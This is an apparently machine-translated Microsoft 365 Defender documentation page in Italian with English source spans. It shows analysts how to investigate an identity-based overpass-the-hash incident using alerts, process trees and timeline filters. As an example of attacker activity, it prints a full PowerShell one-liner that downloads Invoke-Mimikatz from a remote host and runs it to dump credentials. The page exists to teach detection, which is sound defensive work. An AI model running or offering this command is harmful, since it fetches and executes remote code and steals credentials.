---
title: Esempio di attacco basato su identità
description: Eseguire un'analisi di esempio di un attacco basato sull'identità.
keywords: incidenti, avvisi, indagare, correlazione, attacco, computer, dispositivi, utenti, identità, identità, cassetta postale, posta elettronica, 365, microsoft, m365, risposta a eventi imprevisti, cyberattacco
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
ms.translationtype: MT
ms.contentlocale: it-IT
ms.lasthandoff: 04/30/2021
ms.locfileid: "52114859"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="c0772-104">Esempio di attacco basato su identità</span><span class="sxs-lookup"><span data-stu-id="c0772-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="c0772-105">**Si applica a:**</span><span class="sxs-lookup"><span data-stu-id="c0772-105">**Applies to:**</span></span>
- <span data-ttu-id="c0772-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="c0772-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="c0772-107">Microsoft Defender for Identity consente di rilevare tentativi dannosi di compromettere le identità nell'organizzazione.</span><span class="sxs-lookup"><span data-stu-id="c0772-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="c0772-108">Poiché Defender for Identity si integra con Microsoft 365 Defender, gli analisti della sicurezza possono avere visibilità sulle minacce provenienti da Defender per l'identità, ad esempio i tentativi di elevazione dei privilegi Netlogon sospetti.</span><span class="sxs-lookup"><span data-stu-id="c0772-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="c0772-109">Analisi dell'attacco in Microsoft Defender for Identity</span><span class="sxs-lookup"><span data-stu-id="c0772-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="c0772-110">Microsoft 365 Defender consente agli analisti di filtrare gli avvisi in base all'origine di rilevamento nella **scheda Avvisi** della pagina eventi imprevisti.</span><span class="sxs-lookup"><span data-stu-id="c0772-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="c0772-111">Nell'esempio seguente l'origine di rilevamento viene filtrata in **Defender per Identità**.</span><span class="sxs-lookup"><span data-stu-id="c0772-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Esempio di filtro dell'origine di rilevamento per Defender for Identity":::

<span data-ttu-id="c0772-113">Selezionando **l'avviso sospetto di attacco overpass-the-hash** viene visualizzata una pagina in Microsoft Cloud App Security in cui vengono visualizzate informazioni più dettagliate.</span><span class="sxs-lookup"><span data-stu-id="c0772-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="c0772-114">Per ulteriori informazioni su un avviso o  un attacco, selezionare Ulteriori [](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) informazioni su questo tipo di avviso per leggere una descrizione dell'attacco e suggerimenti di correzione.</span><span class="sxs-lookup"><span data-stu-id="c0772-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Esempio di avviso di attacco overpass-the-hash sospetto"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="c0772-116">Analisi dello stesso attacco in Microsoft Defender for Endpoint</span><span class="sxs-lookup"><span data-stu-id="c0772-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="c0772-117">In alternativa, un analista può usare Defender for Endpoint per altre informazioni sull'attività in un endpoint.</span><span class="sxs-lookup"><span data-stu-id="c0772-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="c0772-118">Selezionare l'evento imprevisto dalla coda degli eventi imprevisti, quindi selezionare la **scheda** Avvisi. Da qui, possono identificare anche l'origine di rilevamento.</span><span class="sxs-lookup"><span data-stu-id="c0772-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="c0772-119">Un'origine di rilevamento etichettata come EDR sta per Endpoint Detection and Response, che è Defender for Endpoint.</span><span class="sxs-lookup"><span data-stu-id="c0772-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="c0772-120">Da qui, l'analista seleziona un avviso rilevato da EDR.</span><span class="sxs-lookup"><span data-stu-id="c0772-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Esempio di rilevamento e risposta degli endpoint in Defender for Endpoint"::: 

<span data-ttu-id="c0772-122">Nella pagina di avviso vengono visualizzate varie informazioni pertinenti, ad esempio il nome del dispositivo, il nome utente, lo stato dell'analisi automatica e i dettagli dell'avviso.</span><span class="sxs-lookup"><span data-stu-id="c0772-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="c0772-123">La storia dell'avviso rappresenta una rappresentazione visiva dell'albero del processo.</span><span class="sxs-lookup"><span data-stu-id="c0772-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="c0772-124">L'albero dei processi è una rappresentazione gerarchica dei processi padre e figlio correlati all'avviso.</span><span class="sxs-lookup"><span data-stu-id="c0772-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Esempio di un albero del processo di avviso in Defender for Endpoint"::: 

<span data-ttu-id="c0772-126">Ogni processo può essere espanso per visualizzare ulteriori dettagli.</span><span class="sxs-lookup"><span data-stu-id="c0772-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="c0772-127">I dettagli che un analista può visualizzare sono i comandi effettivi immessi come parte di uno script dannoso, indirizzi IP di connessione in uscita e altre informazioni utili.</span><span class="sxs-lookup"><span data-stu-id="c0772-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Esempio di dettagli del processo in Defender for Endpoint":::
 
<span data-ttu-id="c0772-129">Selezionando **Vedi nella sequenza temporale,** un analista può eseguire il drill-down ulteriormente per determinare l'ora esatta della compromissione.</span><span class="sxs-lookup"><span data-stu-id="c0772-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="c0772-130">Microsoft Defender for Endpoint può rilevare molti file e script dannosi.</span><span class="sxs-lookup"><span data-stu-id="c0772-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="c0772-131">Tuttavia, a causa di molti usi legittimi per le connessioni in uscita, PowerShell e attività da riga di comando, alcune attività vengono considerate benigne fino a quando non crea un file o un'attività dannosa.</span><span class="sxs-lookup"><span data-stu-id="c0772-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="c0772-132">Pertanto, l'uso della sequenza temporale consente agli analisti di mettere l'avviso nel contesto dell'attività circostante per determinare l'origine o l'ora dell'attacco che altrimenti viene oscurato dalle attività comuni del file system e degli utenti.</span><span class="sxs-lookup"><span data-stu-id="c0772-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="c0772-133">A tale scopo, un analista inizierà al momento del rilevamento degli avvisi (in rosso) e scorrerà indietro nel tempo per determinare quando è stata effettivamente avviata l'attività originale che ha portato all'attività dannosa.</span><span class="sxs-lookup"><span data-stu-id="c0772-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Esempio di avvio al momento del rilevamento degli avvisi"::: 

<span data-ttu-id="c0772-135">È importante comprendere e distinguere attività comuni come le connessioni Windows Update, il traffico di attivazione del software attendibile Windows, altre connessioni comuni ai siti Microsoft, attività Internet di terze parti, attività di Microsoft Endpoint Configuration Manager e altre attività benigne da attività sospette.</span><span class="sxs-lookup"><span data-stu-id="c0772-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="c0772-136">Un modo per ottenere questo risultato è usare i filtri della sequenza temporale.</span><span class="sxs-lookup"><span data-stu-id="c0772-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="c0772-137">Esistono molti filtri che possono evidenziare attività specifiche filtrando tutto ciò che l'analista non vuole visualizzare.</span><span class="sxs-lookup"><span data-stu-id="c0772-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="c0772-138">Nell'immagine seguente l'analista ha filtrato per visualizzare solo gli eventi di rete ed elaborazione.</span><span class="sxs-lookup"><span data-stu-id="c0772-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="c0772-139">In questo modo l'analista può visualizzare le connessioni di rete e i processi che circondano l'evento in cui Blocco note stabilito una connessione con un indirizzo IP, che abbiamo visto anche nell'albero dei processi.</span><span class="sxs-lookup"><span data-stu-id="c0772-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Esempio di utilizzo Blocco note per effettuare una connessione in uscita dannosa"::: 

<span data-ttu-id="c0772-141">In questo particolare evento è stato Blocco note una connessione in uscita dannosa.</span><span class="sxs-lookup"><span data-stu-id="c0772-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="c0772-142">Tuttavia, spesso gli utenti malintenzionati usano semplicemente iexplorer.exe per stabilire connessioni per scaricare un payload dannoso perché in genere iexplorer.exe processi sono considerati attività regolari del Web browser.</span><span class="sxs-lookup"><span data-stu-id="c0772-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="c0772-143">Un altro elemento da cercare nella sequenza temporale è l'utilizzo di PowerShell per le connessioni in uscita.</span><span class="sxs-lookup"><span data-stu-id="c0772-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="c0772-144">L'analista cerca connessioni PowerShell riuscite con comandi quali una connessione in uscita a un sito `IEX (New-Object Net.Webclient)` Web che ospita un file dannoso.</span><span class="sxs-lookup"><span data-stu-id="c0772-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="c0772-145">Nell'esempio seguente, PowerShell è stato usato per scaricare ed eseguire Mimikatz da un sito Web:</span><span class="sxs-lookup"><span data-stu-id="c0772-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="c0772-146">Un analista può cercare rapidamente parole chiave digitando la parola chiave nella barra di ricerca per visualizzare solo gli eventi creati con PowerShell.</span><span class="sxs-lookup"><span data-stu-id="c0772-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="c0772-147">Passaggio successivo</span><span class="sxs-lookup"><span data-stu-id="c0772-147">Next step</span></span>

<span data-ttu-id="c0772-148">Vedi il percorso di analisi del [phishing.](first-incident-path-phishing.md)</span><span class="sxs-lookup"><span data-stu-id="c0772-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="c0772-149">Vedere anche</span><span class="sxs-lookup"><span data-stu-id="c0772-149">See also</span></span>

- [<span data-ttu-id="c0772-150">Panoramica degli eventi imprevisti</span><span class="sxs-lookup"><span data-stu-id="c0772-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="c0772-151">Gestire gli incidenti</span><span class="sxs-lookup"><span data-stu-id="c0772-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="c0772-152">Analizzare gli incidenti</span><span class="sxs-lookup"><span data-stu-id="c0772-152">Analyze incidents</span></span>](investigate-incidents.md)
